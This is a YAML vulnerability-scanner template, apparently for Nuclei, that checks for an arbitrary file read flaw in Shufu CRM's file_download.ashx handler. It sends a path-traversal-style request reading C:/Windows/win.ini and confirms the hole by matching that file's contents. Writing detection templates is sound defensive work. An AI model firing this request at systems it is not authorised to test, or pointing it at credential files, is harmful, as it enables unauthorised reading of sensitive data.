id: shufu-crm-lfi

info:
  name: 数夫CRM任意文件读取漏洞
  author: bl
  severity: high
  description: |
    数夫CRM /Web/common/Handler/file_download.ashx接口存在任意文件读取漏洞
  reference:
    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E6%95%B0%E5%A4%ABCRM/%E6%95%B0%E5%A4%ABCRM%E6%8E%A5%E5%8F%A3file_download%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md
  tags: 数夫CRM

http:
  - method: GET
    path:
      - "{{BaseURL}}/Web/common/Handler/file_download.ashx?filepath=C:/Windows/win.ini"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'bit app support'
          - 'fonts'
          - 'extensions'
        condition: and
      - type: status
        status:
          - 200